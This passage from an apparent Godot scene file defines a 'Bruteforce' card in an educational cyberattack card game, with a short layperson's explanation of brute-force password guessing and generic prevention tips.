text = "Bruteforce"

[node name="Label" parent="CyberAttackCards/VBoxContainer/Bruteforce_card/MarginContainer/VBoxContainer" index="3"]
text = "A brute force attack is when someone tries to guess a password by testing every possible combination until they find the right one. It’s like trying every key on a keychain to open a locked door—slow but effective if the lock (or password) is weak. To prevent this change your password more frequently and use special characters."

